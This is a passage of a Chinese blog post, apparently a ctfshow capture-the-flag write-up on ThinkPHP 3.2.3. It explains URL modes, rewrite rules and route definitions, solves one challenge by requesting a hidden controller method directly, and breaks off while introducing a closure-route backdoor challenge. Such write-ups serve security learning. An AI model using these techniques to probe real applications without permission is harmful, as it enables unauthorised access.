
<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="UTF-8" />
        <title>ctfshow ThinkPHP专题 | 雲流のLowest World</title>
        <meta name="author" content="C1oudfL0w0" />
        <meta name="description" content="" />
        <meta name="keywords" content="" />
        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
        <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
        <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入jQuery-->
<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<!-- 引入不蒜子<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>-->
    
        <script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
    <meta name="generator" content="Hexo 6.3.0"></head>
    <body>
        <!--flag{never_g0nna g1ve_you up}-->
        
        <!-- 页面点击小红心与文字 -->
        <script type = "text/javascript" src = "/blog/js/love-click.js"></script>

        <!-- 浏览器标题 -->
         <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
         
        <!--动态背景-->
        <script type="text/javascript"
        color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

        <!--文章目录-->
        
    <div id="toc" class="toc-article">
    <h3><i class="fa-brands fa-readme"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web569%EF%BC%88pathinfo%EF%BC%89"><span class="toc-text">web569（pathinfo）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#URL%E6%A8%A1%E5%BC%8F"><span class="toc-text">URL模式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E6%A8%A1%E5%BC%8F"><span class="toc-text">普通模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PATHINFO%E6%A8%A1%E5%BC%8F"><span class="toc-text">PATHINFO模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#REWRITE%E6%A8%A1%E5%BC%8F"><span class="toc-text">REWRITE模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%BC%E5%AE%B9%E6%A8%A1%E5%BC%8F"><span class="toc-text">兼容模式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web570%EF%BC%88%E8%B7%AF%E7%94%B1%EF%BC%89"><span class="toc-text">web570（路由）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1"><span class="toc-text">路由</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E5%AE%9A%E4%B9%89"><span class="toc-text">路由定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%84%E5%88%99%E8%B7%AF%E7%94%B1%E3%80%81%E6%AD%A3%E5%88%99%E8%B7%AF%E7%94%B1%E3%80%81%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1"><span class="toc-text">规则路由、正则路由、静态路由</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AD%E5%8C%85%E6%94%AF%E6%8C%81"><span class="toc-text">闭包支持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web571%EF%BC%88%E6%8E%A7%E5%88%B6%E5%99%A8%EF%BC%89"><span class="toc-text">web571（控制器）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-text">控制器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%90%8E%E7%BD%AE%E6%93%8D%E4%BD%9C"><span class="toc-text">前置后置操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Action%E5%8F%82%E6%95%B0%E7%BB%91%E5%AE%9A"><span class="toc-text">Action参数绑定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E9%85%8D%E7%BD%AE"><span class="toc-text">其它配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E6%96%B9%E6%B3%95"><span class="toc-text">内置方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%BF%87%E6%BB%A4"><span class="toc-text">变量过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-2"><span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#show%E6%96%B9%E6%B3%95%E6%B8%B2%E6%9F%93%E5%86%85%E5%AE%B9"><span class="toc-text">show方法渲染内容</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web572%EF%BC%88%E6%97%A5%E5%BF%97%E6%B3%84%E9%9C%B2%EF%BC%89"><span class="toc-text">web572（日志泄露）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B3%84%E9%9C%B2"><span class="toc-text">日志泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-3"><span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web573%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-text">web573（sql注入）</span></a></li></ol>
    </div>
  
        
        <!--返回顶部-->
        <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
            <a title="返回顶部">↑</a>
            </div>
        <script src="/blog/js/totop.js"></script>

        <div id="layout">
            <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
            </transition>
            <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>ctfshow ThinkPHP专题</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/11/18
        </span>
        
        <span class="category">
            <a href="/blog/categories/Web/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                Web
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/ctfshow/" style="color: #00a596">ctfshow</a>
            </span>
            
        </span>
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">3.9k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">16分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>结合我的另一篇ThinkPHP反序列化研究来学习</p>
<span id="more"></span>

<h1 id="web569（pathinfo）"><a href="#web569（pathinfo）" class="headerlink" title="web569（pathinfo）"></a>web569（pathinfo）</h1><p>版本3.2.3</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">flag在Admin模块的Login控制器的ctfshowLogin方法中<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>我们先查一下官方文档：<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp/1697">https://www.kancloud.cn/manual/thinkphp/1697</a></p>
<hr>
<h2 id="URL模式"><a href="#URL模式" class="headerlink" title="URL模式"></a>URL模式</h2><p>先了解一下ThinkPHP3.2.3的标准URL格式</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//serverName/index.php/模块/控制器/操作</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注：ThinkPHP框架的URL区分大小写，如果要不区分需要在框架内配置（当开启调试模式的情况下，这个参数是false）</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'URL_CASE_INSENSITIVE'</span>  <span class="token operator">=></span>  <span class="token constant boolean">true</span><span class="token punctuation">,</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果我们直接访问入口文件的话，由于URL中没有模块、控制器和操作，因此系统会访问默认模块（Home）下面的默认控制器（Index）的默认操作（index），因此下面的访问是等效的：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//serverName/index.php</span></span>
<span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//serverName/index.php/Home/Index/index</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这种URL模式就是系统默认的<code>PATHINFO</code>模式，可以设置<strong>URL_MODEL</strong>参数改变URL模式</p>
<table>
<thead>
<tr>
<th>URL模式</th>
<th>URL_MODEL设置</th>
</tr>
</thead>
<tbody><tr>
<td>普通模式</td>
<td>0</td>
</tr>
<tr>
<td>PATHINFO模式</td>
<td>1</td>
</tr>
<tr>
<td>REWRITE模式</td>
<td>2</td>
</tr>
<tr>
<td>兼容模式</td>
<td>3</td>
</tr>
</tbody></table>
<h3 id="普通模式"><a href="#普通模式" class="headerlink" title="普通模式"></a>普通模式</h3><blockquote>
<p>传统的GET传参方式来指定当前访问的模块和操作</p>
</blockquote>
<p>例如： <code>http://localhost/?m=home&amp;c=user&amp;a=login&amp;var=value</code>（这里m参数表示模块，c参数表示控制器，a参数表示操作，后面的表示其他GET参数）</p>
<p>我们可以修改对应的系统配置来更改变量名（注：VAR_MODULE只能在应用配置文件中设置，其他参数可以则也可以在模块配置中设置）</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'VAR_MODULE'</span>            <span class="token operator">=></span>  <span class="token string single-quoted-string">'module'</span><span class="token punctuation">,</span>     <span class="token comment">// 默认模块获取变量</span>
<span class="token string single-quoted-string">'VAR_CONTROLLER'</span>        <span class="token operator">=></span>  <span class="token string single-quoted-string">'controller'</span><span class="token punctuation">,</span>    <span class="token comment">// 默认控制器获取变量</span>
<span class="token string single-quoted-string">'VAR_ACTION'</span>            <span class="token operator">=></span>  <span class="token string single-quoted-string">'action'</span><span class="token punctuation">,</span>    <span class="token comment">// 默认操作获取变量</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>上面的访问地址则变成： <code>http://localhost/?module=home&amp;controller=user&amp;action=login&amp;var=value</code></p>
<h3 id="PATHINFO模式"><a href="#PATHINFO模式" class="headerlink" title="PATHINFO模式"></a>PATHINFO模式</h3><blockquote>
<p>默认的url模式，不过依然可以采用普通URL模式的参数方式</p>
</blockquote>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//localhost/index.php/home/user/login/var/value/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>前三个参数分别表示模块&#x2F;控制器&#x2F;操作</p>
<ul>
<li><p>在PATHINFO模式下，URL是可定制的，配置：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 更改PATHINFO参数分隔符</span>
<span class="token string single-quoted-string">'URL_PATHINFO_DEPR'</span><span class="token operator">=></span><span class="token string single-quoted-string">'-'</span><span class="token punctuation">,</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>于是访问的url就要改成<code>http://localhost/index.php/home-user-login-var-value</code></p>
</li>
</ul>
<h3 id="REWRITE模式"><a href="#REWRITE模式" class="headerlink" title="REWRITE模式"></a>REWRITE模式</h3><blockquote>
<p>在PATHINFO模式的基础上添加了重写规则的支持，可以去掉URL地址里面的入口文件index.php，但是需要额外配置WEB服务器的重写规则</p>
</blockquote>
<p>以Apache为例，在入口文件的同级添加.htaccess文件：</p>
<pre class="line-numbers language-htaccess" data-language="htaccess"><code class="language-htaccess">&lt;IfModule mod_rewrite.c&gt;
 RewriteEngine on
 RewriteCond %&#123;REQUEST_FILENAME&#125; !-d
 RewriteCond %&#123;REQUEST_FILENAME&#125; !-f
 RewriteRule ^(.*)$ index.php&#x2F;$1 [QSA,PT,L]
&lt;&#x2F;IfModule&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么访问的url就变成了<code>http://localhost/home/user/login/var/value</code></p>
<h3 id="兼容模式"><a href="#兼容模式" class="headerlink" title="兼容模式"></a>兼容模式</h3><blockquote>
<p>用于不支持PATHINFO的特殊环境</p>
</blockquote>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//localhost/?s=/home/user/login/var/value</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以更改兼容模式变量的名称定义：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'VAR_PATHINFO'</span>          <span class="token operator">=></span>  <span class="token string single-quoted-string">'path'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>也可以像上面PATHINFO模式一样更改参数分隔符：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 更改PATHINFO参数分隔符</span>
<span class="token string single-quoted-string">'URL_PATHINFO_DEPR'</span><span class="token operator">=></span><span class="token string single-quoted-string">'-'</span><span class="token punctuation">,</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>url变为：<code>http://localhost/?path=/home-user-login-var-value</code></p>
<p>也可以通过重写web服务器规则定义来实现和REWRITE模式一样的效果</p>
<pre class="line-numbers language-htaccess" data-language="htaccess"><code class="language-htaccess">&lt;IfModule mod_rewrite.c&gt;
 RewriteEngine on
 RewriteCond %&#123;REQUEST_FILENAME&#125; !-d
 RewriteCond %&#123;REQUEST_FILENAME&#125; !-f
 RewriteRule ^(.*)$ index.php?s&#x3D;&#x2F;$1 [QSA,PT,L]
&lt;&#x2F;IfModule&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>url变为：<code>http://localhost/home/user/login/var/value</code></p>
<hr>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>回到题目，题目告诉我们是pathinfo模式，根据题目要求，我们可以直接访问</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">/index.php/Admin/Login/ctfshowLogin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>即可得到flag</p>
<hr>
<h1 id="web570（路由）"><a href="#web570（路由）" class="headerlink" title="web570（路由）"></a>web570（路由）</h1><p>版本3.2.3</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">黑客建立了闭包路由后门，你能找到吗<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>了解一下路由：<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp/1705">https://www.kancloud.cn/manual/thinkphp/1705</a></p>
<h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p>PATH_INFO模式或兼容URL模式下使用，配置文件中开启，可以针对模块也可以针对全局</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 开启路由</span>
<span class="token string single-quoted-string">'URL_ROUTER_ON'</span>   <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>配置路由规则：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'URL_ROUTE_RULES'</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span>
    <span class="token string single-quoted-string">'news/:year/:month/:day'</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'News/archive'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'status=1'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'news/:id'</span>               <span class="token operator">=></span> <span class="token string single-quoted-string">'News/read'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'news/read/:id'</span>          <span class="token operator">=></span> <span class="token string single-quoted-string">'/news/:1'</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="路由定义"><a href="#路由定义" class="headerlink" title="路由定义"></a>路由定义</h3><p><code>&#39;路由表达式&#39;=&gt;&#39;路由地址和传入参数&#39;</code>或<code>array(&#39;路由表达式&#39;,&#39;路由地址&#39;,&#39;传入参数&#39;)</code></p>
<ul>
<li><p>路由表达式：</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>正则表达式</td>
<td>&#x2F;^blog&#x2F;(\d+)$&#x2F;</td>
</tr>
<tr>
<td>规则表达式</td>
<td>blog&#x2F;:id</td>
</tr>
</tbody></table>
</li>
<li><p>路由地址：</p>
<table>
<thead>
<tr>
<th>定义方式</th>
<th>定义格式</th>
</tr>
</thead>
<tbody><tr>
<td>方式1：路由到内部地址（字符串）</td>
<td>‘[控制器&#x2F;操作]?额外参数1&#x3D;值1&amp;额外参数2&#x3D;值2…’</td>
</tr>
<tr>
<td>方式2：路由到内部地址（数组）参数采用字符串方式</td>
<td>array(‘[控制器&#x2F;操作]’,’额外参数1&#x3D;值1&amp;额外参数2&#x3D;值2…’)</td>
</tr>
<tr>
<td>方式3：路由到内部地址（数组）参数采用数组方式</td>
<td>array(‘[控制器&#x2F;操作]’,array(‘额外参数1’&#x3D;&gt;’值1’,’额外参数2’&#x3D;&gt;’值2’…)[,路由参数])</td>
</tr>
<tr>
<td>方式4：路由到外部地址（字符串）301重定向</td>
<td>‘外部地址’</td>
</tr>
<tr>
<td>方式5：路由到外部地址（数组）可以指定重定向代码</td>
<td>array(‘外部地址’,’重定向代码’[,路由参数])</td>
</tr>
<tr>
<td>方式6：闭包函数</td>
<td>function($name){ echo ‘Hello,’.$name;}</td>
</tr>
</tbody></table>
<p>如果定义的是全局路由（在公共模块的配置文件中定义），那么路由地址的定义格式中需要增加模块名，如：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'blog/:id'</span><span class="token operator">=></span><span class="token string single-quoted-string">'Home/blog/read'</span> <span class="token comment">// 表示路由到Home模块的blog控制器的read操作方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果路由地址以“&#x2F;”或者“http”开头则会认为是一个重定向地址或者外部地址</p>
</li>
<li><p>路由参数：</p>
<p>限制URL后缀：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'blog/:id'</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'blog/read'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'status=1&amp;app_id=5'</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ext'</span><span class="token operator">=></span><span class="token string single-quoted-string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>	<span class="token comment">// 限制了html后缀访问该路由规则生效</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>限制请求类型：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'blog/:id'</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'blog/read'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'status=1&amp;app_id=5'</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'method'</span><span class="token operator">=></span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>	<span class="token comment">// 限制了只有GET请求</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>自定义检测：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'blog/:id'</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'blog/read'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'status=1&amp;app_id=5'</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'callback'</span><span class="token operator">=></span><span class="token string single-quoted-string">'checkFun'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>	<span class="token comment">// 自定义checkFun函数来检测是否生效，如果函数返回false则表示不生效</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<h3 id="规则路由、正则路由、静态路由"><a href="#规则路由、正则路由、静态路由" class="headerlink" title="规则路由、正则路由、静态路由"></a>规则路由、正则路由、静态路由</h3><p>这个建议直接看文档</p>
<h3 id="闭包支持"><a href="#闭包支持" class="headerlink" title="闭包支持"></a>闭包支持</h3><blockquote>
<p>可以使用闭包的方式定义一些特殊需求的路由，而不需要执行控制器的操作方法</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'URL_ROUTE_RULES'</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span>
    <span class="token string single-quoted-string">'test'</span>        <span class="token operator">=></span> 
        <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'just test'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'hello/:name'</span> <span class="token operator">=></span> 
        <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hello,'</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token string single-quoted-string">'blog/:year/:month'</span> <span class="token operator">=></span> 
    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$year</span><span class="token punctuation">,</span><span class="token variable">$month</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'year='</span><span class="token operator">.</span><span class="token variable">$year</span><span class="token operator">.</span><span class="token string single-quoted-string">'&amp;month='</span><span class="token operator">.</span><span class="token variable">$month</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token string single-quoted-string">'/^new\/(\d&#123;4&#125;)\/(\d&#123;2&#125;)$/'</span> <span class="token operator">=></span> 
    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$year</span><span class="token punctuation">,</span><span class="token variable">$month</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'year='</span><span class="token operator">.</span><span class="token variable">$year</span><span class="token operator">.</span><span class="token string single-quoted-string">'&amp;month='</span><span class="token operator">.</span><span class="token variable">$month</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p>参数传递：</p>
<p>规则路由下访问<code>http://serverName/Home/hello/thinkphp</code>则输出<code>Hello,thinkphp</code>，对应第二个路由规则</p>
